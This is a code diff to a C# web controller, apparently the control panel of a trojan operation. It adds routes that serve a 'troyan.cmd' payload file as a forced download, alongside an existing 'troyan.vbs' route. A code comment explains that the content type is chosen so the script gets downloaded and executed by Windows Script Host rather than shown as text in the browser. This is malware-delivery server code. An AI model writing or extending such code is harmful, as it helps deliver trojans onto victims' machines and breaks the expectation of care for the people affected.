@@ -95,6 +95,12 @@ public class CpController : BaseController
     [HttpGet("/{profile}/{random}/{target}/GetVbs")]
     public IActionResult GetVbsLegacy(string profile, string random, string target) => TroyanVbsFromUserData();
 
+    [HttpGet("/GetCmd")]
+    public IActionResult GetCmd() => TroyanCmdFromUserData();
+
+    [HttpGet("/{profile}/{random}/{target}/GetCmd")]
+    public IActionResult GetCmdLegacy(string profile, string random, string target) => TroyanCmdFromUserData();
+
     IActionResult TroyanVbsFromUserData()
     {
         var path = _serverService.Layout().UserTroyanVbs;
@@ -102,6 +108,14 @@ public class CpController : BaseController
             return NotFound();
         // text/plain makes browsers render the payload in-tab instead of downloading; WSH never runs it.
         return PhysicalFile(path, "application/octet-stream", "troyan.vbs");
+    }
+
+    IActionResult TroyanCmdFromUserData()
+    {
+        var path = _serverService.Layout().UserTroyanCmd;
+        if (!System.IO.File.Exists(path))
+            return NotFound();
+        return PhysicalFile(path, "application/octet-stream", "troyan.cmd");
     }
 
     [HttpPost]
